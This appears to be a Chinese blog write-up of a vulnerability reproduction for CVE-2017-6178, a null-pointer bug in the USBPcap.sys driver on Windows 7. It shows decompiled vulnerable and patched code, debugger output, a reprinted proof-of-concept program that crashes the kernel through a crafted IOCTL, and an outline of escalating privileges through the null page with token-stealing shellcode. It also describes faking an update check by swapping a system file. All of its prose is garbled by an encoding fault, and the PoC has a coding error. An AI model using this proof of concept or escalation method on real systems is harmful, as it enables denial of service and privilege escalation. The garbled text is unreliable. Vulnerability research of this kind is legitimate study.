---
title: 'CVE-2017-6178 æ¼æ´å¤ç°'
date: 2022-07-26 17:04:13
category: CVE
tags: [windows kernel]
published: true
hideInList: false
feature: 
isTop: false
---

å¤ç°`CVE-2017-6178`æ—¶ï¼Œè¿˜æ˜¯è¸©äº†å¾ˆå¤šå‘çš„

## ç¯å¢ƒ

```
è™šæ‹Ÿæœºï¼šWin7 SP1 x86
ç‰©ç†æœºï¼šWin10
debuggerï¼šwindbg preview
compilerï¼švs2022
```

ä¸»è¦ä¸ºäº†è·å–`x86`çš„`USBPcap.sys`èŠ±è´¹äº†å¾ˆå¤šæ—¶é—´ï¼Œé¦–å…ˆæ ¹æ®`CVE-2017-6178`çš„æ¼æ´æè¿°ä»¥åŠ`exploit-db`çš„è¯´æ˜ï¼Œå¯çŸ¥å…¶å®å¯ä»¥é€šè¿‡å®‰è£…[Wireshark-win32-2.2.5.exe](https://2.na.dl.wireshark.org/win32/all-versions/Wireshark-win32-2.2.5.exe)å¾—åˆ°`USBPcap.sys`

ä½†æ˜¯æˆ‘æœ€åˆçš„æ—¶å€™ï¼Œé€šè¿‡`Win7 SP x64`å®‰è£…ï¼Œä½†æ˜¯è¿™æ ·å¾—åˆ°çš„æ˜¯`x64`çš„`USBPcap.sys`ï¼ˆæˆ‘ä¸ç¡®å®šæ˜¯å¦å­˜åœ¨æ´ï¼Œæœ€ååˆ†æå®Œäº†ä¹‹åçœ‹`x64`ç‰ˆæœ¬æ˜¯æœ‰çš„ï¼Œå…¶å®`github`ä¸Š`1.0.0.7`é‡Œé¢ä¹Ÿæœ‰æ´ï¼Œå¯æ˜¯å½“æ—¶æˆ‘æ²¡ç¿»åˆ°è¿™ä¸ªæ–‡ä»¶ğŸ™ƒï¼‰ï¼Œäºæ˜¯æˆ‘æŠŠ`x64`ä¸Šå¾—åˆ°çš„`USBPcapSetup-1.1.0.0-g794bf26-5.exe`æ”¾åˆ°`win7 x86`ä¸Šè¿›è¡Œå®‰è£…ï¼Œæœ€åå¾—åˆ°äº†`x86`çš„`USBPcap.sys`ï¼ˆç›´æ¥æ‹¿32ä½çš„`wireshark-2.2.5.exe`å®‰è£…ä¹Ÿåº”è¯¥å¯ä»¥ï¼‰

è¿™ä¸ªæ—¶å€™å°±æŠ¥å‡ºï¼Œéœ€è¦å°†`win7`æ›´æ–°åˆ°å®‰è£…äº†`KB3033929`çš„ç‰ˆæœ¬ï¼Œä½†æ˜¯æˆ‘å·²ç»å®‰è£…äº†ï¼Œæœ€ååœ¨`USBPcap`çš„`github`ä»“åº“çš„[issue](https://github.com/desowin/usbpcap/issues/31)ï¼Œæ‰¾åˆ°äº†ä¸€ä¸ªä¼ªè£…è‡ªå·±å·²ç»å®‰è£…äº†`KB3033929`çš„æ–¹æ³•

é€šè¿‡åˆ›å»ºä¸€ä¸ªå†…å®¹ä¸º`@echo KB3033929`çš„`findstr.cmd`æ–‡ä»¶ï¼Œæ”¾å…¥`c:\windows\system32`ç›®å½•ï¼Œå¹¶å°†å…¶ç›®å½•ä¸‹çš„`findstr.exe`ä¿®æ”¹åå­—ï¼Œä»è€Œå®ç°æŸ¥è¯¢æ—¶ï¼Œè¿”å›å·²å®‰è£…çš„ç»“æœ

æ³¨ï¼šè¿™ä¸ªåœ°æ–¹ï¼Œéœ€è¦é‡å‘½å`findstr.exe`çš„æ—¶å€™éœ€è¦ä¿®æ”¹`findstr.exe`æ–‡ä»¶çš„`own`å’Œèµ‹äºˆ`admin`æƒé™ï¼Œå‚è€ƒ[è¿™ç¯‡åšå®¢](https://blog.csdn.net/zy_strive_2012/article/details/79470829)

## æ¼æ´åˆ†æ

è¿™ä¸ªæ¼æ´å…¶å®æ¯”è¾ƒç®€å•ï¼Œå°±æ˜¯åœ¨è®¾ç½®`dispatchHandler`æ—¶ï¼Œå¯¹äº`IRP_MJ_FILE_SYSTEM_CONTROL 0x0d`ï¼Œè¿™ä¸ª`handler`ä¸­å¤„ç†å‡ºé”™ï¼ˆæ³¨ï¼š`sub_1145A`å³`IRP_MJ_FILE_SYSTEM_CONTROL`çš„`handler`ï¼‰

```c
int __stdcall sub_1145A(int a1, PVOID Tag)
{
  _DEVICE_OBJECT *v2; // edi
  int v3; // eax
  _DEVICE_OBJECT *DriverObject; // ecx
  NTSTATUS v6; // edi
  _DEVICE_OBJECT **p_AttachedDevice; // [esp-Ch] [ebp-18h]
  int v8; // [esp+14h] [ebp+8h]

  v2 = *(_DEVICE_OBJECT **)(a1 + 40);
  v3 = IoAcquireRemoveLockEx((PIO_REMOVE_LOCK)&v2->AttachedDevice, Tag, &File, 1u, 0x18u);
  v8 = v3;
  if ( v3 >= 0 )
  {
    DriverObject = (_DEVICE_OBJECT *)v2->DriverObject;
    ++*((_BYTE *)Tag + 35);
    *((_DWORD *)Tag + 24) += 36;
    p_AttachedDevice = &v2->AttachedDevice;
    v6 = IofCallDriver(DriverObject, (PIRP)Tag);// vuln
    IoReleaseRemoveLockEx((PIO_REMOVE_LOCK)p_AttachedDevice, Tag, 0x18u);
    return v6;
  }
  else
  {
    sub_11434((PIRP)Tag, v3, 0);
    return v8;
  }
}
```

è¿™ä¸ªåœ°æ–¹å¹¶æœªåˆ¤æ–­`DriverObject`æ˜¯å¦ä¸º`NULL`ï¼Œè€Œå¯¼è‡´è¿™ä¸ªæœªåˆå§‹åŒ–çš„å€¼ç›´æ¥ä¼ å…¥äº†`IofCallDriver`ï¼Œä»è€Œå‡ºç°äº†ç©ºæŒ‡é’ˆè§£å¼•ç”¨çš„é”™è¯¯

æœ€ç»ˆ`crash`ä½ç½®

```
Access violation - code c0000005 (!!! second chance !!!)
eax=87b91268 ebx=86ff89f0 ecx=0000000d edx=87b911f8 esi=00000000 edi=86ff89e0
eip=83e57f7b esp=8a987ac0 ebp=8a987ac8 iopl=0         nv up ei ng nz na po cy
cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00010383
nt!IofCallDriver+0x57:
83e57f7b 8b4608          mov     eax,dword ptr [esi+8] ds:0023:00000008=????????
```

## POC

å› ä¸ºæ˜¯`IRP_MJ_FILE_SYSTEM_CONTROL`ï¼Œæ‰€ä»¥è¦ç”¨`FILE_DEVICE_FILE_SYSTEM`çš„`IOCTL`æ‰å¯ä»¥

```c
#define FILE_DEVICE_FILE_SYSTEM         0x00000009
#define FILE_DEVICE_UNKNOWN             0x00000022
```

æœ€ç»ˆ`POC`æ˜¯ç›´æ¥ç”¨çš„[ k0keoyoå¸ˆå‚…çš„POC ](https://github.com/k0keoyo/try_exploit/blob/master/_cve_2017_6178_poc/_CVE_2017_6178_PoC.cpp)

```c
#include <stdio.h>
#include <windows.h>

int main(int argc, char *argv[])
{
    HANDLE hDevice;
    DWORD dwRetBytes = 0;
    hDevice = CreateFile("\\\\.\\USBPcap1", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);

    if (hDevice == INVALID_HANDLE_VALUE)
    {
        printf("[-] CreateFile failed (%.08x)\n", GetLastError());
        return -1;
    }
    bResult = DeviceIoControl(hDevice, 0x00090000,(LPVOID)0x1, (DWORD)0, NULL, 0, &dwRetBytes, NULL);
    if (!bResult)
    {
        printf("[-] DeviceIOControl failed (%.08x)\n",GetLastError());
        return 0;
    }
    printf("[+] if show this info ,PoC is failed:(\n\n");
    return 0;
}
```

## patch

ä¿®å¤è¿™ä¸ªæ¼æ´ä¹Ÿå¾ˆç®€å•ï¼Œå°±æ˜¯åˆ¤æ–­ä¸€ä¸‹è¿™ä¸ª`DriverObject`æ˜¯ä¸æ˜¯åˆå§‹åŒ–çš„`NULL`

```c
NTSTATUS __stdcall sub_402038(int a1, PVOID Tag)
{
  _DEVICE_OBJECT *v2; // ebx
  int v3; // eax
  NTSTATUS v4; // edi
  struct _DEVICE_OBJECT *DriverObject; // ecx

  v2 = *(_DEVICE_OBJECT **)(a1 + 40);
  v3 = IoAcquireRemoveLockEx((PIO_REMOVE_LOCK)&v2->AttachedDevice, Tag, &File, 1u, 0x18u);
  v4 = v3;
  if ( v3 >= 0 )
  {
    DriverObject = (struct _DEVICE_OBJECT *)v2->DriverObject;
    if ( DriverObject )
    {
      ++*((_BYTE *)Tag + 35);
      *((_DWORD *)Tag + 24) += 36;
      v4 = IofCallDriver(DriverObject, (PIRP)Tag);
    }
    else
    {
      v4 = -1073741808;
      sub_40201A((PIRP)Tag, -1073741808, 0);
    }
    IoReleaseRemoveLockEx((PIO_REMOVE_LOCK)&v2->AttachedDevice, Tag, 0x18u);
  }
  else
  {
    sub_40201A((PIRP)Tag, v3, 0);
  }
  return v4;
}
```

## è°ƒè¯•

è°ƒè¯•è¿™è¾¹è¸©å‘ç‰¹åˆ«å¤šï¼Œæœ€åˆå¯¹`DeviceIoControl`çš„æµç¨‹ä¸ç†è§£çš„æ—¶å€™ï¼Œä¸‹æ–­ç‚¹çš„æ—¶å€™ï¼Œä¸€ç›´å‚ç…§å…¶ä»–çš„è°ƒè¯•é©±åŠ¨å‡ºé”™æ—¶çš„`nt!NtDeviceIoControlFile`å‡½æ•°ä¸­ä¸‹æ–­ç‚¹

æœ€åˆæ˜¯ä»¥ä¸ºæ˜¯ï¼Œè‡ªå·±çš„æ¡ä»¶æ–­ç‚¹ä¸ç†Ÿç»ƒï¼Œä»¥åŠ`offset=0`æ—¶ï¼Œè¿™ä¸ª`ebp`è¿˜ä¸æ˜¯åç»­çš„`ebp`æ‰€ä»¥å‡ºé”™

```
nt!NtDeviceIoControlFile:
840a07a9 8bff            mov     edi,edi
840a07ab 55              push    ebp
840a07ac 8bec            mov     ebp,esp
840a07ae 6a01            push    1
840a07b0 ff752c          push    dword ptr [ebp+2Ch]
840a07b3 ff7528          push    dword ptr [ebp+28h]
840a07b6 ff7524          push    dword ptr [ebp+24h]
840a07b9 ff7520          push    dword ptr [ebp+20h]
840a07bc ff751c          push    dword ptr [ebp+1Ch]
840a07bf ff7518          push    dword ptr [ebp+18h]
840a07c2 ff7514          push    dword ptr [ebp+14h]
840a07c5 ff7510          push    dword ptr [ebp+10h]
840a07c8 ff750c          push    dword ptr [ebp+0Ch]
840a07cb ff7508          push    dword ptr [ebp+8]
840a07ce e8a682fbff      call    nt!IopXxxControlFile (84058a79)
840a07d3 5d              pop     ebp
840a07d4 c22800          ret     28h
```

åæ¥æ‰å‘ç°æ˜¯å› ä¸ºï¼Œè¿™ä¸ª`DeviceIoControl`å› ä¸ºæ˜¯`#define FILE_DEVICE_FILE_SYSTEM         0x00000009`ï¼Œæ‰€ä»¥èµ°çš„æ˜¯å¦å¤–ä¸€æ¡è·¯ï¼Œåº”è¯¥æ˜¯åœ¨`nt!NtFsControlFile`ä¸­ä¸‹æ–­ç‚¹

æœ€ç»ˆæ¡ä»¶æ–­ç‚¹çš„æŒ‡ä»¤ä¸º

```
bp nt!NtFsControlFile+0x25 ".printf\"IOCTL:%p\",dwo(esp+0x14);.echo;g"
bp nt!NtFsControlFile+0x25 ".if(dwo(esp+0x14)=0x00090000){}.else{gc;}"
bp nt!IofCallDriver+60 ".if(ecx=0xd){}.else{gc;}"
```

è¿™ä¸ªåœ°æ–¹ä¹Ÿå¯ä»¥ç”¨`poi`ï¼Œå…³äº[dwo qwo poiçš„åŒºåˆ«](https://stackoverflow.com/questions/37991872/how-to-reference-32bit-integer-data-in-a-64-bit-dump)ï¼Œ[å¤šä¸ªæ¡ä»¶çš„æ–­ç‚¹](https://stackoverflow.com/questions/6097157/conditional-breakpoint-that-tests-multiple-stack-variables)ï¼Œ[echo](https://blogs.keysight.com/blogs/tech/nwvs.entry.html/2020/07/27/debugging_malwarewi-hk5u.html)

## è¯¥POCçš„æ•´ä¸ªæµç¨‹

ä¸ºäº†è°ƒè¯•å¼„æ¸…`DeviceIoControl`ä»ç”¨æˆ·æ€å¦‚ä½•åˆ°äº†é©±åŠ¨çš„`dispatch Handler`ï¼Œæˆ‘åœ¨å¦‚ä¸‹åœ°æ–¹ä¸‹äº†æ–­ç‚¹

```
bp kernel32!DeviceIoControl
bp kernel32!DeviceIoControlImplementation
bp kernelbase!DeviceIoControl
```

å‘ç°é¦–å…ˆä¼šæ–­åœ¨`kernel32!DeviceIoControlImplementation`ï¼Œå†æ˜¯`kernel32!DeviceIoControl`ï¼Œæœ€åæ˜¯`kernelbase!DeviceIoControl`

å› æ­¤è¯¥æµç¨‹åº”è¯¥å¦‚ä¸‹

ç”¨æˆ·æ€çš„`DeviceIoControl` 

=> å†…æ ¸çš„`ntoskrnl.exe`çš„`ZwDeviceIoControl`å‡½æ•°ï¼ˆé€šè¿‡`call KiSystemService`ï¼‰ 

```c
NTSTATUS __stdcall ZwDeviceIoControlFile(...)
{
  __readeflags();
  return KiSystemService(8);
}
```

=> å†…æ ¸`kernel32.dll`çš„`DeviceIoControlImplementation`ï¼ˆé€šè¿‡`call DeviceIoControl`ï¼‰

```c
BOOL __stdcall DeviceIoControlImplementation(...)
{
  DWORD v8; // esi
  NTSTATUS v10; // eax

  v8 = dwIoControlCode;
  if ( dwIoControlCode != 0x2D4808 && dwIoControlCode != 0x74808 && dwIoControlCode != 0x90020
    || NtCurrentTeb()->ProcessEnvironmentBlock->SessionId == MEMORY[0x7FFE02D8] )
  {
    return DeviceIoControl(...);
  }
  v10 = IsTSAppCompatEnabled((BOOL *)&dwIoControlCode);
  if ( v10 >= 0 )
  {
    if ( dwIoControlCode && !IsCallerAdminOrSystem() )
    {
      BaseSetLastNTError(-1073741790);
      return 0;
    }
    return DeviceIoControl(...);
  }
  BaseSetLastNTError(v10);
  return 0;
}
```

=> å†…æ ¸`kernel32.dll`çš„`DeviceIoControl`ï¼ˆé€šè¿‡`plt`ï¼‰

```c
// attributes: thunk
BOOL __stdcall DeviceIoControl(...)
{
  return __imp__DeviceIoControl@32(...);
}
```

=> å†…æ ¸`kernelbase.dll`çš„`DeviceIoControl`ï¼Œåœ¨è¯¥å‡½æ•°é€šè¿‡åˆ¤æ–­æ˜¯å¦ä¸º`FILE_DEVICE_FILE_SYSTEM`è€Œåˆ¤æ–­è¿›`NtFsControlFile`è¿˜æ˜¯`NtDeviceIoControlFile`

```c
#define FILE_DEVICE_FILE_SYSTEM         0x00000009
#define FILE_DEVICE_UNKNOWN             0x00000022
```

```c
BOOL __stdcall DeviceIoControl(
        HANDLE hDevice,
        DWORD dwIoControlCode,
        LPVOID lpInBuffer,
        DWORD nInBufferSize,
        LPVOID lpOutBuffer,
        DWORD nOutBufferSize,
        LPDWORD lpBytesReturned,
        LPOVERLAPPED lpOverlapped)
{
  HANDLE hEvent; // eax
  int v9; // eax
  int Status; // eax
  struct _IO_STATUS_BLOCK IoStatusBlock; // [esp+10h] [ebp-20h] BYREF
  CPPEH_RECORD ms_exc; // [esp+18h] [ebp-18h]

  if ( !lpOverlapped )
  {
    if ( (dwIoControlCode & 0xFFFF0000) == 0x90000 )
      Status = NtFsControlFile(
                 hDevice,
                 0,
                 0,
                 0,
                 &IoStatusBlock,
                 dwIoControlCode,
                 lpInBuffer,
                 nInBufferSize,
                 lpOutBuffer,
                 nOutBufferSize);
    else
      Status = NtDeviceIoControlFile(
                 hDevice,
                 0,
                 0,
                 0,
                 &IoStatusBlock,
                 dwIoControlCode,
                 lpInBuffer,
                 nInBufferSize,
                 lpOutBuffer,
                 nOutBufferSize);
    if ( Status == 0x103 )
    {
      Status = NtWaitForSingleObject(hDevice, 0, 0);
      if ( Status < 0 )
      {
LABEL_15:
        if ( (Status & 0xC0000000) != -1073741824 )
          *lpBytesReturned = IoStatusBlock.Information;
        BaseSetLastNTError(Status);
        return 0;
      }
      Status = IoStatusBlock.Status;
    }
    if ( Status >= 0 )
    {
      *lpBytesReturned = IoStatusBlock.Information;
      return 1;
    }
    goto LABEL_15;
  }
  ....
  return 0;
}
```

å¦‚æœæ˜¯`NtDeviceIoControlFile`çš„è¯
```
=> å†…æ ¸ ntdll.dll çš„ ZwDeviceIoControlFileï¼ˆcall KiFastSystemCallï¼‰
=> å†…æ ¸ ntoskrnl.exe çš„ NtDeviceIoControlFile 
=> å†…æ ¸ ntoskrnl.exe çš„ IopXxxControlFile
```

å¦‚æœæ˜¯`NtFsControlFile`çš„è¯
```
=> å†…æ ¸ ntdll.dll çš„ ZwFsControlFileï¼ˆcall KiFastSystemCallï¼‰
=> å†…æ ¸ ntoskrnl.exe çš„ NtFsControlFile
=> å†…æ ¸ ntoskrnl.exe çš„ IopXxxControlFile
```

`IopXxxControlFile`å‡½æ•°ä¼šå¯¹`IRP`è¿›è¡Œå°è£…å’Œåˆ†å‘ï¼Œåœ¨`IopXxxControlFile`å‡½æ•°ä¸­ä¼šè°ƒç”¨`IopSynchronousServiceTail`ï¼Œåœ¨`IopSynchronousServiceTail`ä¸­ä¼šè°ƒç”¨`IofCallDriver`

åœ¨`IofCallDriver`ä¸­ï¼Œå¯¹äºä¸åŒçš„`v5`è°ƒç”¨ä¹‹å‰é©±åŠ¨ä¸­è®¾ç½®å¥½çš„`dispatch Handler`

```c
NTSTATUS __fastcall IofCallDriver(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
  unsigned int v4; // eax
  unsigned __int8 v5; // cl
  char v6; // al
  void *retaddr; // [esp+Ch] [ebp+4h]

  if ( pIofCallDriver )
    return pIofCallDriver(DeviceObject, Irp, retaddr);
  if ( --Irp->CurrentLocation <= 0 )
    KeBugCheckEx(0x35u, (ULONG_PTR)Irp, 0, 0, 0);
  v4 = Irp->Tail.Overlay.PacketType - 36;
  Irp->Tail.Overlay.PacketType = v4;
  v5 = *(_BYTE *)v4;
  *(_DWORD *)(v4 + 20) = DeviceObject;
  if ( v5 == 22 && ((v6 = *(_BYTE *)(v4 + 1), v6 == 2) || v6 == 3) )
    return IopPoHandleIrp();
  else
    return DeviceObject->DriverObject->MajorFunction[v5](DeviceObject, Irp);
}
```

å…¶æ±‡ç¼–ä¸º`call    dword ptr [eax+ecx*4+38h] : ecx = 0xd`ï¼Œè€Œ`0xd`æ­£æ˜¯`IRP_MJ_FILE_SYSTEM_CONTROL`

å› æ­¤å¯¹äºå½“å‰è¿™ä¸ª`POC`ï¼Œå…¶æ•´ä¸ª`DeviceIoControl`çš„æµç¨‹ä¸º

```
UserMode!DeviceIoControl 
-> ntoskrnl!ZwDeviceIoControl 
-> kernel32!DeviceIoControlImplementation 
-> kernel32!DeviceIoControl 
-> kernelbase!DeviceIoControl 
-> ntdll!ZwFsControlFile 
-> ntoskrnl!NtDeviceIoControlFile 
-> ntoskrnl!IopXxxControlFile 
-> ntoskrnl!IopSynchronousServiceTail 
-> ntoskrnl!IofCallDriver 
-> USBPcap!IRP_MJ_FILE_SYSTEM_CONTROL_dispatch_handler
```

## EXP

æœ€åè¿™ä¸ª`crash`ä½ç½®æ˜¯`83e57f7b 8b4608          mov     eax,dword ptr [esi+8]`
è€Œæ­¤æ—¶ï¼Œ`esi=0x0`ï¼Œè¿™ä¸ªå†…å­˜ä¸å­˜åœ¨ï¼Œå› æ­¤å‡ºé”™ï¼Œè€Œ`win7`è¿˜å¯ä»¥å¯¹`0`åœ°å€è¿›è¡Œåˆ†é…å†…å­˜ï¼Œå› æ­¤å¯ä»¥ç›´æ¥åœ¨`0`åœ°æ–¹åˆ†é…å†…å­˜ï¼Œåˆ™æœ€åä¼š`call [eax+ecx*4+38h]`ï¼Œè€Œæ­¤æ—¶ï¼Œ`ecx=0xd`ï¼Œå› æ­¤ç›¸å½“äº`call [0x6c]`

```
nt!IofCallDriver+0x57:
83e74f7b 8b4608          mov     eax,dword ptr [esi+8]
83e74f7e 52              push    edx
83e74f7f 0fb6c9          movzx   ecx,cl
83e74f82 56              push    esi
83e74f83 ff548838        call    dword ptr [eax+ecx*4+38h]
```

æŒ‰ç…§ä¹‹å‰çš„`HEVD`å†™ä¸ª`shellcode`ï¼Œ`steal token`å°±å¯ä»¥ææƒï¼Œæœ€åæ³¨æ„èƒ½ä½¿æµç¨‹æ­£å¸¸è¿”å›å³å¯

## æ€»ç»“

å…¶å®æ¼æ´æ¯”è¾ƒç®€å•ï¼Œå°±æ˜¯åœ¨æ•´ä¸ªè¿‡ç¨‹çš„ç¯å¢ƒæ­å»ºå’Œè°ƒè¯•ç£¨äº†å¾ˆé•¿æ—¶é—´ï¼Œç„¶åç†Ÿæ‚‰äº†ä¸€ä¸‹`DeviceIoControl`çš„æ•´ä¸ªè°ƒç”¨é“¾

## å‚è€ƒ

> https://www.anquanke.com/post/id/86203
> https://www.exploit-db.com/exploits/41542
